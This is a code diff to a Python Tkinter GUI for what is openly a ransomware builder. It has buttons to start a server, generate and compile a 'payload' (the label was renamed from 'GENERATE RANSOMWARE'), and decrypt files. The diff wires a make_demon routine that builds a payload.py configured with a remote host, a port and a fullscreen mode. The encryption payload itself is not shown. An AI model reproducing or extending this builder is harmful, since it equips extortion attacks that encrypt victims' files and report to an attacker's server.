@@ -7,6 +7,8 @@ from tkinter import messagebox
 from pymsgbox import *
 from io import BytesIO
 
+from src.create_demon import *
+
 try:
     from Crypto import Random
     from Crypto.Cipher import AES
@@ -89,15 +91,15 @@ class MainWindow(Tk):
             'platform' : StringVar(),
             'key' : StringVar(),
             'os' : StringVar(),
-            'mode' : StringVar(),
+            'full_screen_var' : StringVar(),
+            'mode' : IntVar(),
         }
-
-        self.options['host'].set('0.0.0.0')
-        self.options['port'].set(8989)
 
         # Default Settings
         self.options['host'].set('0.0.0.0')
         self.options['port'].set(8989)
+        self.options['full_screen_var'].set(1)
+        self.options['mode'].set(1)
 
         self.bind("<Escape>", self.exit_event) # Press ESC to quit app
 
@@ -113,8 +115,8 @@ class MainWindow(Tk):
 
         # Buttons
         start_server = Button(self, text = "START SERVER", command = self.open_server, width = 53).grid(row = 4, column = 0, columnspan = 6)
-        generate_demon = Button(self, text = "GENERATE RANSOMWARE", command = self.generate, width = 53).grid(row = 5, column = 0, columnspan = 6)
-        compile = Button(self, text = "COMPILE TO BINARY", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
+        generate_demon = Button(self, text = "GENERATE PAYLOAD", command = self.generate, width = 53).grid(row = 5, column = 0, columnspan = 6)
+        compile = Button(self, text = "COMPILE PAYLOAD", command = self.compile, width = 53).grid(row = 6, column = 0, columnspan = 6)
         decrypt = Button(self, text = "DECRYPT FILES", command = self.decrypt_files, width = 53).grid(row = 7, column = 0, columnspan = 6)
         exit = Button(self, text = "EXIT", command = self.exit, width = 53).grid(row = 8, column = 0, columnspan = 6)
 
@@ -245,30 +247,37 @@ class MainWindow(Tk):
 
         self.gen.bind("<Escape>", self.close_generate) # Press ESC to close window
 
-        host = '0.0.0.0'
-        port = 8989
-        full_screen = IntVar()
-
-
         mode_frame = LabelFrame(self.gen, text = 'Mode')
         mode_frame.grid(row = 0, column = 0)
-        gui = Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 'gui').grid(row = 0, column = 0, sticky = 'w')
-        term = Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 'term').grid(row = 1, column = 0, sticky = 'w')
-        full = Checkbutton(mode_frame, text = "Fullscreen mode", variable = full_screen, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')
+        Radiobutton(mode_frame, text = 'GUI', variable = self.options['mode'], value = 1).grid(row = 0, column = 0, sticky = 'w')
+        Radiobutton(mode_frame, text = 'Console', variable = self.options['mode'], value = 2, command = self.check_settings).grid(row = 1, column = 0, sticky = 'w')
+        Checkbutton(mode_frame, text = "Fullscreen mode", variable = self.options['full_screen_var'], command = self.check_settings, onvalue = 1, offvalue = 0).grid(row = 0, column = 1, sticky = 'w')
 
         server_frame = LabelFrame(self.gen, text = 'Remote Server')
         server_frame.grid(row = 0, column = 1)
         Label(server_frame, text = 'Host:').grid(row = 0, column = 0, sticky = 'w')
-        host = Entry(server_frame, textvariable = host, width = 20)
-        host.grid(row = 0, column = 1)
+        Entry(server_frame, textvariable = self.options['host'], width = 20).grid(row = 0, column = 1)
 
         Label(server_frame, text = 'Port:').grid(row = 1, column = 0, sticky = 'w')
-        port = Entry(server_frame, textvariable = port, width = 20)
-        port.grid(row = 1, column = 1)
+        Entry(server_frame, textvariable = self.options['port'], width = 20).grid(row = 1, column = 1)
 
         finish_frame = LabelFrame(self.gen, text = 'Finish')
         finish_frame.grid(row = 1, column = 0, columnspan = 2)
-        generate = Button(finish_frame, text = "GENERATE", command = self.gen.destroy, width = 20).grid(row = 0, column = 0)
+        generate = Button(finish_frame, text = "GENERATE", command = self.make_demon, width = 20).grid(row = 0, column = 0)
+
+    def check_settings(self):
+        if self.options['mode'].get() == 2:
+            self.options['full_screen_var'].set(0)
+            messagebox.showwarning('Disabled', 'Fullscreen mode is for GUI mode only, fullscreen mode automaticly disabled!')
+
+
+    def make_demon(self):
+        try:
+            create_demon(self.options['host'].get(), self.options['port'].get(), self.options['full_screen_var'].get())
+            messagebox.showinfo('SUCCESS', 'Payload successfully generated!\n\nFile saved to ./payload.py')
+            self.gen.destroy()
+        except Exception as e:
+            messagebox.showwarning('ERROR', 'Failed to generate payload!\n\n%s' % e)
 
     def decrypt_files(self):
         key = dec_key()
